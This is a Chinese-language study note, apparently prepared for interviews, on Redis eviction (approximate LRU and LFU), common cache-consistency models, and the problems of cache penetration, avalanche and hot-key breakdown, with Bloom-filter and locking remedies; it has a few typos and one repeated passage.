<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg4MmM5OGQ3MGQyZGNmYWRjMGU1ODk1N2JjMzgxMDNfU0RPTms2c0NsS2s4ekJuQlVkSkRLUzF5WXBVbWZWam5fVG9rZW46TnZUYmJUNWtsb1Z6SWF4QUw2aWNVdzJhbmk3XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>算法我们弄明白了，不过这里大家要注意一下：Redis中的<code>KEY</code>可能有数百万甚至更多，每个KEY都有自己访问时间或者逻辑访问次数。我们要找出时间最早的或者访问次数最小的，难道要把Redis中<strong>所有数据排序</strong>？</p>
<p>要知道Redis的内存淘汰是在每次执行命令时处理的。如果每次执行命令都先对全量数据做内存排序，那命令的执行时长肯定会非常长，这是不现实的。</p>
<p>所以Redis采取的是<strong>抽样法</strong>，即每次抽样一定数量（<code>maxmemory_smples</code>）的key，然后基于内存策略做排序，找出淘汰优先级最高的，删除这个key。这就导致Redis的算法并不是真正的<strong>LRU</strong>，而是一种基于抽样的<strong>近似LRU算法</strong>。</p>
<p>不过，在Redis3.0以后改进了这个算法，引入了一个淘汰候选池，抽样的key要与候选池中的key比较淘汰优先级，优先级更高的才会被放入候选池。然后在候选池中找出优先级最高的淘汰掉，这就使算法的结果更接近与真正的LRU算法了。特别是在抽样值较高的情况下（例如10），可以达到与真正的LRU接近的效果。</p>
<p><strong>面试题</strong>：<strong>那你能聊聊LRU和LFU吗</strong>？</p>
<p><strong>答</strong>：<code>LRU</code>是最近最久未使用。Redis的Key都是RedisObject，当启用LRU算法后，Redis会在Key的头信息中使用24个bit记录每个key的最近一次使用的时间<code>lru</code>。每次需要内存淘汰时，就会抽样一部分KEY，找出其中空闲时间最长的，也就是<code>now - lru</code>结果最大的，然后将其删除。如果内存依然不足，就重复这个过程。</p>
<p>由于采用了抽样来计算，这种算法只能说是一种近似LRU算法。因此在Redis4.0以后又引入了<code>LFU</code>算法，这种算法是统计最近最少使用，也就是按key的访问频率来统计。当启用LFU算法后，Redis会在key的头信息中使用24bit记录最近一次使用时间和逻辑访问频率。其中高16位是以分钟为单位的最近访问时间，后8位是逻辑访问次数。与LFU类似，每次需要内存淘汰时，就会抽样一部分KEY，找出其中逻辑访问次数最小的，将其淘汰。</p>
<h2 id="redis缓存">redis缓存</h2>
<h3 id="缓存一致性">缓存一致性</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjgzNTEwNTQ1MTg1MmU1MDNkMWM0NTEwM2I4MTgzZjRfeFlhZXNobWdUT2R5ZTJiWjJiNlZxc1QyV3BlNHBac0FfVG9rZW46VDVsMmJPRVRZb1ZYTTl4WTllZGN5dGVwbjJiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="缓存模型">缓存模型</h4>
<p>我们先看下目前企业用的最多的缓存模型。缓存的通用模型有三种：</p>
<ul>
<li><code>Cache Aside</code>：由缓存调用者自己维护数据库与缓存的一致性。即：
<ul>
<li>查询时：命中则直接返回，未命中则查询数据库并写入缓存</li>
<li>更新时：更新数据库并删除缓存，查询时自然会更新缓存</li>
</ul>
</li>
<li><code>Read/Write Through</code>：数据库自己维护一份缓存，底层实现对调用者透明。底层实现：
<ul>
<li>查询时：命中则直接返回，未命中则查询数据库并写入缓存</li>
<li>更新时：判断缓存是否存在，不存在直接更新数据库。存在则更新缓存，同步更新数据库</li>
</ul>
</li>
<li><code>Write Behind Cahing</code>：读写操作都直接操作缓存，由线程异步的将缓存数据同步到数据库</li>
</ul>
<p>这是目前企业中常见的三种缓存模型的说明，下面对每种模型进行详细解析，并分析其特点、优缺点和适用场景。</p>
<ol>
<li>
<h2 id="Cache-Aside-模型"><strong>Cache Aside 模型</strong></h2>
</li>
</ol>
<p><strong>（缓存旁路模型，最常用的一种）</strong></p>
<h4 id="工作流程"><strong>工作流程</strong></h4>
<ol>
<li><strong>查询时</strong>：
<ol>
<li>先查缓存，<strong>命中缓存</strong>则直接返回结果。</li>
<li>如果<strong>未命中缓存</strong>，则查询数据库，获取数据后，将结果写入缓存，再返回给调用方。</li>
</ol>
</li>
<li><strong>更新时</strong>：
<ol>
<li>先更新数据库，<strong>然后删除缓存</strong>（而不是更新缓存）。</li>
<li>查询时，如果缓存不存在，则重新从数据库查询，并写入缓存。</li>
</ol>
</li>
</ol>
<h4 id="特点"><strong>特点</strong></h4>
<ul>
<li><strong>缓存数据的控制权</strong>由调用者（即应用程序）负责。</li>
<li>更新缓存不是直接写入，而是通过“删除”来保证查询时的一致性。</li>
</ul>
<h4 id="优点"><strong>优点</strong></h4>
<ul>
<li>逻辑简单：查询和更新操作独立，降低了缓存与数据库之间的耦合度。</li>
<li><strong>缓存穿透问题易处理</strong>：未命中时通过查询数据库填充缓存。</li>
<li><strong>缓存雪崩问题易控制</strong>：通过设置缓存的过期时间和异步更新机制减轻影响。</li>
</ul>
<h4 id="缺点"><strong>缺点</strong></h4>
<ul>
<li>有可能存在 <strong>短时间内数据不一致</strong> 的问题：
<ul>
<li>更新数据库后，如果删除缓存失败，则缓存中的旧数据还会被访问。</li>
<li>需要确保缓存的删除操作一定成功。</li>
</ul>
</li>
<li>数据的生命周期需要程序明确管理，缓存的内容需要定期更新。</li>
</ul>
<h4 id="适用场景"><strong>适用场景</strong></h4>
<ul>
<li>高读、低写的业务场景，例如用户详情、商品详情等频繁查询但更新较少的业务场景。</li>
</ul>
<ol>
<li>
<h2 id="Read-Write-Through-模型"><strong>Read/Write Through 模型</strong></h2>
</li>
</ol>
<p><strong>（读写穿透模型）</strong></p>
<h4 id="工作流程-2"><strong>工作流程</strong></h4>
<ol>
<li><strong>查询时</strong>：
<ol>
<li>调用者不直接操作数据库，而是先查缓存。</li>
<li>如果缓存<strong>命中</strong>，直接返回结果；如果缓存<strong>未命中</strong>，则底层缓存模块会查询数据库，获取结果后再写入缓存。</li>
</ol>
</li>
<li><strong>更新时</strong>：
<ol>
<li>调用者只操作缓存模块。</li>
<li>底层缓存模块会判断缓存是否存在：
<ul>
<li>如果缓存中有数据，则更新缓存，同时同步更新数据库。</li>
<li>如果缓存中没有数据，则直接更新数据库。</li>
</ul>
</li>
</ol>
</li>
</ol>
<h4 id="特点-2"><strong>特点</strong></h4>
<ul>
<li><strong>缓存与数据库的同步由底层实现，调用者无需关注。</strong></li>
<li>对调用者来说，缓存与数据库是一体化的，操作过程完全透明。</li>
</ul>
<h4 id="优点-2"><strong>优点</strong></h4>
<ul>
<li>调用者代码逻辑简单，无需手动维护缓存和数据库的一致性。</li>
<li>缓存与数据库的同步逻辑由底层封装，减少开发复杂度。</li>
</ul>
<h4 id="缺点-2"><strong>缺点</strong></h4>
<ul>
<li>增加了缓存与数据库之间的耦合。</li>
<li>数据写入的延迟较大，因为每次写操作都需要同时更新缓存和数据库。</li>
<li>适合较小规模的缓存场景，大规模场景中可能会导致缓存同步成为性能瓶颈。</li>
</ul>
<h4 id="适用场景-2"><strong>适用场景</strong></h4>
<ul>
<li>需要保证缓存与数据库一致性的场景，例如配置数据。</li>
<li>数据读写比例均衡的场景，例如某些中型应用的配置中心或实时性较高的业务。</li>
</ul>
<ol>
<li>
<h2 id="Write-Behind-Caching-模型"><strong>Write Behind Caching 模型</strong></h2>
</li>
</ol>
<p><strong>（异步写缓存模型）</strong></p>
<h4 id="工作流程-3"><strong>工作流程</strong></h4>
<ol>
<li><strong>查询时</strong>：
<ol>
<li>只操作缓存，读取缓存数据返回结果。</li>
<li>如果缓存中没有数据，则查询数据库，同时将数据加载到缓存中。</li>
</ol>
</li>
<li><strong>更新时</strong>：
<ol>
<li>调用者直接更新缓存数据。</li>
<li>缓存模块会启动一个异步线程，将缓存中的数据<strong>异步同步到数据库</strong>。</li>
<li>数据写入数据库的时间点可以根据业务需要控制，例如批量写入、定时写入等。</li>
</ol>
</li>
</ol>
<h4 id="特点-3"><strong>特点</strong></h4>
<ul>
<li><strong>读写操作都只操作缓存，数据库更新由异步线程完成。</strong></li>
<li>调用者只需要关心缓存层的操作。</li>
</ul>
<h4 id="优点-3"><strong>优点</strong></h4>
<ul>
<li>读写操作速度快，因为操作的是内存中的缓存。</li>
<li>写操作不会因为数据库的慢速响应而阻塞调用者。</li>
<li>支持批量写入和合并写入，减少数据库的压力。</li>
</ul>
<h4 id="缺点-3"><strong>缺点</strong></h4>
<ul>
<li>数据的一致性无法实时保证：
<ul>
<li>在异步同步的过程中，数据库数据可能是旧数据。</li>
<li>如果异步线程在同步过程中失败，会导致数据丢失。</li>
</ul>
</li>
<li>实现复杂度较高，需要确保异步线程可靠。</li>
</ul>
<h4 id="适用场景-3"><strong>适用场景</strong></h4>
<ul>
<li>高写、高读的场景，例如用户行为日志、大型电商的订单缓存。</li>
<li>对数据一致性要求不高，或者可以容忍短时间不一致的业务场景。</li>
</ul>
<h3 id="总结"><strong>总结</strong></h3>
<ol>
<li>企业中最常用的是 <strong>Cache Aside 模型</strong>，因为其简单性和灵活性可以覆盖大部分场景。</li>
<li><strong>Read/Write Through</strong> 模型适合对一致性要求较高的小型场景，但性能会是瓶颈。</li>
<li><strong>Write Behind Caching</strong> 更适合高并发、高写入的场景，但对数据一致性要求较低的业务。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGU3OGYxMmRmYWZmODM3YjA2YzE5MjFiZDRiMTdmOTdfbzFkbGpEWDJDT2VwQ1Z0Vkg3WkZrNUY5eERTSnh5dUpfVG9rZW46UWR5R2JPVG1ub2pkUkp4SmR4QWN5R0ZzbkZmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><code>Cache Aside</code>的写操作是要在更新数据库的同时删除缓存，那为什么不选择更新数据库的同时更新缓存，而是删除呢？</p>
<p>原因很简单，假如一段时间内无人查询，但是有多次更新，那这些更新都属于无效更新。采用删除方案也就是延迟更新，什么时候有人查询了，什么时候更新。</p>
<h4 id="先删除缓存再更新数据库">先删除缓存再更新数据库</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTk4MGNkODY3MTE2ZTY4ODI3NGU0NDUzMzJhMjE1MThfMHZpTWRzQTZ6NFV1bllnTDdXQlJqN0t6Rm95UTRvbVBfVG9rZW46SXNDemJiVlllbzNhYk14NXpBd2Nnb2VUblNoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>正常情况</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzJlZjFhMTFjNjJkYmE3N2YyZGY4NGMyOGZlZDc4M2NfZ1BjSnRTU05zZG1UZDFXWHFjOVJ6WVpzWTVpc1JCRTZfVG9rZW46VmN6RWJSWktJb2w3NXB4ZlF5b2Ntalc1bnBnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>异常情况</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDg3OGI5ZDBhOTM4MTMzODYzYmRhNTk3OWZhZWFiYTZfRFNLV3BzTWZjbW5YWFpoSlBValFnUzBDY1pmQjAyZGFfVG9rZW46SEQxNWJ2YzZDb2doMm54VVNaVmNqQ1ZGbmRnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>异常情况说明：</p>
<ul>
<li>线程1删除缓存后，还没来得及更新数据库，</li>
<li>此时线程2来查询，发现缓存未命中，于是查询数据库，写入缓存。由于此时数据库尚未更新，查询的是旧数据。也就是说刚才的删除白删了，缓存又变成旧数据了。</li>
<li>然后线程1更新数据库，此时数据库是新数据，缓存是旧数据</li>
</ul>
<p>由于更新数据库的操作本身比较耗时，在期间有线程来查询数据库并更新缓存的概率非常高。因此不推荐这种方案。</p>
<h4 id="先更新数据库再删除缓存：">先更新数据库再删除缓存：</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTkzN2E0N2E2NzJkMGIwMjIwNjhkZmIxZTYwOTU1NjNfa1Y1OVBYbFdKaG1Sa2VpbHBZV3Ezb3gzeVVQNzJkMTlfVG9rZW46RGZjVmJtN2s1b0xPMjV4Z3BqOWNLNDI0bnZjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>正常情况</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTQ1MDFlYWZmNzA5ZGZiZTAzODU0MDI3ZWJlMGM3MjJfdEtUNUZXRzZUaWFoc1VIYlBlWmx4V3RidFFxcFNYS1hfVG9rZW46UDdoU2JoSjhhb0ZtZUF4eGlId2NKSzZhbmxjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>异常情况</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Njg3MGVkNzgzOGQ0YWFhZmM1YWRjNjU0MjE1NGE5ZjRfV0JpbWo3SVNPUndvMDk3VkJqVGZsajFsNEVVVElWOWhfVG9rZW46VW1VamJCS0JMb3dBNUl4UDJqNmNGZXBWblZoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>异常情况说明：</p>
<ul>
<li>线程1查询缓存未命中，于是去查询数据库，查询到旧数据</li>
<li>线程1将数据写入缓存之前，线程2来了，更新数据库，删除缓存</li>
<li>线程1执行写入缓存的操作，写入旧数据</li>
</ul>
<p>可以发现，异常状态发生的概率极为苛刻，线程1必须是查询数据库已经完成，但是缓存尚未写入之前。线程2要完成更新数据库同时删除缓存的两个操作。要知道线程1执行写缓存的速度在毫秒之间，速度非常快，在这么短的时间要完成数据库和缓存的操作，概率非常之低。先更新数据库再删除缓存：</p>
<p><strong>正常情况</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTA4ODAwNDZlMjRkZDgzZDQzZTk5NzMxNDllMjE3ZjRfUDUxeUxlWUtLTkprQkg3NWdNTjNWdFBXTDNzWVJYNUNfVG9rZW46TkFGZGI0bURBb05iZDJ4VnJYbWNQZFMybm5iXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>异常情况</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTEyZGNmZmNkYzJmODFjYmY0Y2Q1Yzk1MTIxMTQ2NzRfU2dneVN1elVMZUtTb3lEUUpUbkRVVkpESE43THRPeVhfVG9rZW46V0paR2JMMGVubzZSYk54SkFkR2Mzc0xXbnlkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>异常情况说明：</p>
<ul>
<li>线程1查询缓存未命中，于是去查询数据库，查询到旧数据</li>
<li>线程1将数据写入缓存之前，线程2来了，更新数据库，删除缓存</li>
<li>线程1执行写入缓存的操作，写入旧数据</li>
</ul>
<p>可以发现，异常状态发生的概率极为苛刻，线程1必须是查询数据库已经完成，但是缓存尚未写入之前。线程2要完成更新数据库同时删除缓存的两个操作。要知道线程1执行写缓存的速度在毫秒之间，速度非常快，在这么短的时间要完成数据库和缓存的操作，概率非常之低。</p>
<h3 id="缓存穿透">缓存穿透</h3>
<p>什么是缓存穿透呢？</p>
<p>我们知道，当请求查询缓存未命中时，需要查询数据库以加载缓存。但是大家思考一下这样的场景：</p>
<blockquote>
<p>如果我访问一个数据库中也不存在的数据。会出现什么现象？</p>
</blockquote>
<p>由于数据库中不存在该数据，那么缓存中肯定也不存在。因此不管请求该数据多少次，缓存永远不可能建立，请求永远会直达数据库。</p>
<p>假如有不怀好意的人，开启很多线程频繁的访问一个数据库中也不存在的数据。由于缓存不可能生效，那么所有的请求都访问数据库，可能就会导致数据库因过高的压力而宕机。</p>
<p>解决这个问题有两种思路：</p>
<ul>
<li>缓存空值</li>
<li>布隆过滤器</li>
</ul>
<h4 id="缓存空值">缓存空值</h4>
<p>简单来说，就是当我们发现请求的数据即不存在与缓存，也不存在与数据库时，将空值缓存到Redis，避免频繁查询数据库。实现思路如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDllMzQxODFhMGQ5ZGFkNGI0ZTEyMmY4YWQ5OWVkMGJfbmlheGp2WmM4TzNreXdmR011OGhXZkVMOWs1UE9YUGRfVG9rZW46Tm4zeGJpdUthb05sQTJ4YmJkSWNLYTdvblZoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>优点：</p>
<ul>
<li>实现简单，维护方便</li>
</ul>
<p>缺点：</p>
<ul>
<li>额外的内存消耗</li>
</ul>
<h4 id="布隆过滤器">布隆过滤器</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmMwODMzMmE0Y2IyMjgzOTA1ODc2NDE1YTBmYWIyYjlfWE15aE1idFFjREd1SXpWbmZkYU1yOGhzbHNlaUJCNHlfVG9rZW46STA3M2JYZ242bzNkbjN4MnN6a2NCVGhlbnljXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTgxYzIzNWVhODgxMDVjZTRkYWFlOTJlYWM2OWNkY2VfaFdDT3J4akd3T3Ywcm1yV05ZdFZOYlhhQWdTRTBPSTNfVG9rZW46UXhyM2JHWk5Cb29EVk94RnJIMmNFdEd5bm5nXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="计数布隆过滤器的流程">计数布隆过滤器的流程</h3>
<h4 id="1-插入元素">1. <strong>插入元素</strong></h4>
<h5 id="插入-apple">插入 <code>&quot;apple&quot;</code></h5>
<ul>
<li>使用哈希函数计算位置：
<ul>
<li><code>h1(&quot;apple&quot;) = 3</code></li>
<li><code>h2(&quot;apple&quot;) = 7</code></li>
</ul>
</li>
<li>在计数器数组的对应位置加 <code>1</code>：</li>
<li><code>初始计数器： [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</code> <code>插入后计数器： [0, 0, 0, 1, 0, 0, 0, 1, 0, 0]</code></li>
</ul>
<h5 id="插入-banana">插入 <code>&quot;banana&quot;</code></h5>
<ul>
<li>使用哈希函数计算位置：
<ul>
<li><code>h1(&quot;banana&quot;) = 2</code></li>
<li><code>h2(&quot;banana&quot;) = 7</code></li>
</ul>
</li>
<li>在计数器数组的对应位置加 <code>1</code>：</li>
<li><code>初始计数器： [0, 0, 0, 1, 0, 0, 0, 1, 0, 0]</code> <code>插入后计数器： [0, 0, 1, 1, 0, 0, 0, 2, 0, 0]</code></li>
</ul>
<h5 id="插入-cherry">插入 <code>&quot;cherry&quot;</code></h5>
<ul>
<li>使用哈希函数计算位置：
<ul>
<li><code>h1(&quot;cherry&quot;) = 3</code></li>
<li><code>h2(&quot;cherry&quot;) = 9</code></li>
</ul>
</li>
<li>在计数器数组的对应位置加 <code>1</code>：</li>
<li><code>初始计数器： [0, 0, 1, 1, 0, 0, 0, 2, 0, 0]</code> <code>插入后计数器： [0, 0, 1, 2, 0, 0, 0, 2, 0, 1]</code></li>
</ul>
<h4 id="2-查询元素">2. <strong>查询元素</strong></h4>
<h5 id="查询-apple">查询 <code>&quot;apple&quot;</code></h5>
<ul>
<li>计算 <code>&quot;apple&quot;</code> 的位置：
<ul>
<li><code>h1(&quot;apple&quot;) = 3</code></li>
<li><code>h2(&quot;apple&quot;) = 7</code></li>
</ul>
</li>
<li>检查这两个位置是否都大于 0：</li>
<li><code>计数器： [0, 0, 1, 2, 0, 0, 0, 2, 0, 1]</code> <code>位置 3 的值：2</code> <code>位置 7 的值：2</code></li>
<li>因为两个位置都大于 0，说明 <code>&quot;apple&quot;</code> <strong>可能存在</strong>。</li>
</ul>
<h5 id="查询-grape">查询 <code>&quot;grape&quot;</code></h5>
<ul>
<li>计算 <code>&quot;grape&quot;</code> 的位置：
<ul>
<li><code>h1(&quot;grape&quot;) = 4</code></li>
<li><code>h2(&quot;grape&quot;) = 6</code></li>
</ul>
</li>
<li>检查这两个位置是否都大于 0：</li>
<li>css</li>
<li>复制代码</li>
<li><code>计数器： [0, 0, 1, 2, 0, 0, 0, 2, 0, 1]</code> <code>位置 4 的值：0</code> <code>位置 6 的值：0</code></li>
<li>因为至少一个位置为 0，说明 <code>&quot;grape&quot;</code> <strong>一定不存在</strong>。</li>
</ul>
<h4 id="3-删除元素">3. <strong>删除元素</strong></h4>
<h5 id="删除-apple">删除 <code>&quot;apple&quot;</code></h5>
<ul>
<li>计算 <code>&quot;apple&quot;</code> 的位置：
<ul>
<li><code>h1(&quot;apple&quot;) = 3</code></li>
<li><code>h2(&quot;apple&quot;) = 7</code></li>
</ul>
</li>
<li>在对应位置减 <code>1</code>：</li>
<li>css</li>
<li>复制代码</li>
<li><code>初始计数器： [0, 0, 1, 2, 0, 0, 0, 2, 0, 1]</code> <code>删除后计数器： [0, 0, 1, 1, 0, 0, 0, 1, 0, 1]</code></li>
</ul>
<h5 id="删除-cherry">删除 <code>&quot;cherry&quot;</code></h5>
<ul>
<li>计算 <code>&quot;cherry&quot;</code> 的位置：
<ul>
<li><code>h1(&quot;cherry&quot;) = 3</code></li>
<li><code>h2(&quot;cherry&quot;) = 9</code></li>
</ul>
</li>
<li>在对应位置减 <code>1</code>：</li>
<li><code>初始计数器： [0, 0, 1, 1, 0, 0, 0, 1, 0, 1]</code> <code>删除后计数器： [0, 0, 1, 0, 0, 0, 0, 1, 0, 0]</code></li>
</ul>
<h4 id="4-再查询-apple-和-cherry">4. <strong>再查询</strong> <strong><code>&quot;apple&quot;</code></strong> <strong>和</strong> <strong><code>&quot;cherry&quot;</code></strong></h4>
<ul>
<li>查询 <code>&quot;apple&quot;</code>：
<ul>
<li><code>h1(&quot;apple&quot;) = 3</code>，<code>h2(&quot;apple&quot;) = 7</code></li>
<li>检查位置：</li>
<li><code>计数器： [0, 0, 1, 0, 0, 0, 0, 1, 0, 0] ``位置 3 的值：0</code></li>
<li>因为有一个位置为 0，说明 <code>&quot;apple&quot;</code> <strong>一定不存在</strong>。</li>
</ul>
</li>
<li>查询 <code>&quot;cherry&quot;</code>：
<ul>
<li><code>h1(&quot;cherry&quot;) = 3</code>，<code>h2(&quot;cherry&quot;) = 9</code></li>
<li>检查位置：</li>
<li><code>计数器： [0, 0, 1, 0, 0, 0, 0, 1, 0, 0] ``位置 3 的值：0</code></li>
<li>因为有一个位置为 0，说明 <code>&quot;cherry&quot;</code> <strong>一定不存在</strong>。</li>
</ul>
</li>
</ul>
<h3 id="总结-2">总结</h3>
<ul>
<li><strong>计数布隆过滤器</strong>通过增加计数器来解决普通布隆过滤器不能删除的问题。</li>
<li>每次插入时计数器增加，每次删除时计数器减少，保证不会误删其他元素。</li>
<li>但仍然存在<strong>误判问题</strong>（判断一个不存在的元素为存在），无法完全避免</li>
</ul>
<h3 id="缓存雪崩">缓存雪崩</h3>
<p>缓存雪崩是指在同一时段大量的缓存key同时失效或者Redis服务宕机，导致大量请求到达数据库，带来巨大压力。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmVkMTVkYjhiOWIxMmI2ODI3NTBkMWJlMTRkYmY5N2ZfTGp5c0pLUnR2UkNGM2szdmRJbkhZV3BYSU5weVFOUExfVG9rZW46TUQwcWJTOXVsb25kTXB4Y29WcWNOU3lzbmxlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>常见的解决方案有：</p>
<ul>
<li>给不同的Key的TTL添加随机值，这样KEY的过期时间不同，不会大量KEY同时过期</li>
<li>利用Redis集群提高服务的可用性，避免缓存服务宕机</li>
<li>给缓存业务添加降级限流策略</li>
<li>给业务添加多级缓存，比如先查询本地缓存，本地缓存未命中再查询Redis，Redis未命中再查询数据库。即便Redis宕机，也还有本地缓存可以抗压力</li>
</ul>
<h3 id="缓存击穿">缓存击穿</h3>
<p><strong>缓存击穿</strong>问题也叫<strong>热点Key</strong>问题，就是一个被<strong>高并发访问</strong>并且<strong>缓存重建业务较复杂</strong>的key突然失效了，无数的请求访问会在瞬间给数据库带来巨大的冲击。</p>
<p>由于我们采用的是<code>Cache Aside</code>模式，当缓存失效时需要下次查询时才会更新缓存。当某个key缓存失效时，如果这个key是热点key，并发访问量比较高。就会在一瞬间涌入大量请求，都发现缓存未命中，于是都会去查询数据库，尝试重建缓存。可能一瞬间就把数据库压垮了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmMzNWVmMWYxNzExMmU3ZWFjMzA3MjRkZjFkN2NjNzhfaXpPaXNNNmVreXNMMUoxQTNYWFZ1NkJXcHJrWTFmRFJfVG9rZW46QjFPZ2J5bXAyb0VsTXd4TUVhaWNPczZWblRjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>如上图所示：</p>
<ul>
<li>线程1发现缓存未命中，准备查询数据库，重建缓存，但是因为数据比较复杂，导致查询数据库耗时较久</li>
<li>在这个过程中，一下次来了3个新的线程，就都会发现缓存未命中，都去查询数据库</li>
<li>数据库压力激增</li>
</ul>
<p>常见的解决方案有两种：</p>
<ul>
<li>互斥锁：给重建缓存逻辑加锁，避免多线程同时指向</li>
<li>逻辑过期：热点key不要设置过期时间，在活动结束后手动删除。</li>
</ul>
<p>（互斥锁就是没有最新的数据的话，就会等待，直到拿到最新数据；</p>
<p>逻辑过期：就是知道现在拿到的是旧数据，但会先拿该旧数据去使用，同时去更新该旧数据）</p>
<p>基于互斥锁的方案如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDk0NDU4ODlmNDI4OTEyMzUwMDRjYzMwYjc0NGY3YjVfZ1VvNkZjTkE3M01mVTNGQ2NHOHRhRTE3bm9OZlpoQWlfVG9rZW46WUNCRmJjdExQbzdlQ054Tk9tZ2NPYWE4bmplXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>逻辑过期的思路如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTJkZWZlZjIwZGEwZGQ5Y2IzOTM2ZGY5ODBhMzgyOTNfeWFjVFNVRjNmVjlBWU5CYjE1TkNDbkFvbFBCU0RLY2lfVG9rZW46S05leGJYRXJFb1laSHd4S2RmcGNLbVJNbnFoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDlhZWIwYTAxZDUzOTVjZGIxZDI3ZjgxNGFlN2ZlNTJfeG96cEViRmxRYTVBQ2FyZlRLb1g5VzNuV1dkV1E3U0ZfVG9rZW46QnZOSGJUTTROb2k2eGZ4c3dKRWNNS1g3bkRlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>微服务面试篇</h1>
